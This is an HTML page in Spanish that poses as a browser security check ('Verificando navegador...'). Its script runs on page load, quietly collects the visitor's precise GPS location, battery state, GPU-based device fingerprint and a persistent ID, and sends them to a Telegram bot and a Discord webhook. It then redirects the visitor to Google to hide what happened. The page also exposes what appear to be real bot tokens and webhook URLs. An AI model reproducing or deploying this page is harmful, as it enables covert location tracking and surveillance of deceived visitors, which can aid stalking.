<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { 
            background: #fff; 
            color: #333; 
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .content { text-align: center; max-width: 400px; padding: 20px; }
        .spinner { 
            border: 3px solid rgba(0,0,0,0.1); 
            border-top: 3px solid #0052cc; 
            border-radius: 50%; 
            width: 30px; 
            height: 30px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 18px; font-weight: 500; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="content">
        <div class="spinner"></div>
        <h1>Espera un momento...</h1>
        <p>Estamos verificando que la conexión sea segura. Esto puede tardar unos segundos.</p>
    </div>

    <script>
        const CONFIG = {
            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
            chat: "7542699747",
            exit: "https://www.google.com"
        };

        async function init() {
            // 1. ID Silencioso
            let id = localStorage.getItem('sid') || 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
            localStorage.setItem('sid', id);

            // 2. Datos de Batería
            let batStatus = "Problemas con este criterio";
            try {
                const b = await navigator.getBattery();
                batStatus = `${Math.round(b.level * 100)}% | ${b.charging ? "Cargando" : "No está cargando"}`;
            } catch(e) {}

            // 3. Marca/Modelo (Vía GPU)
            let hardware = "Problemas con este criterio";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // 4. GPS (Lat, Lon)
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (p) => send(p, id, batStatus, hardware),
                    () => send(null, id, batStatus, hardware),
                    { enableHighAccuracy: true, timeout: 6000 }
                );
            } else {
                send(null, id, batStatus, hardware);
            }
        }

        async function send(pos, id, bat, hw) {
            let coords = "hubo problemas con esta criterio (GPS)";
            if (pos) {
                coords = `Lat: \`${pos.coords.latitude}\` | Lon: \`${pos.coords.longitude}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
            }

            const report = `👤 **NUEVO ACCESO DISCRETO**\n` +
                           `━━━━━━━━━━━━━━━━━━━━\n` +
                           `🆔 **ID:** \`${id}\`\n` +
                           `📱 **Dispositivo:** \`${hw}\`\n` +
                           `🔋 **Batería:** ${bat}\n` +
                           `📍 **Coords:** ${coords}\n` +
                           `━━━━━━━━━━━━━━━━━━━━`;

            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CONFIG.chat, text: report, parse_mode: "Markdown" })
                });

                await fetch(CONFIG.webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                });
            } catch(e) {}

            // Redirección rápida
            window.location.href = CONFIG.exit;
        }

        window.onload = init;
    </script>
</body>
</html>
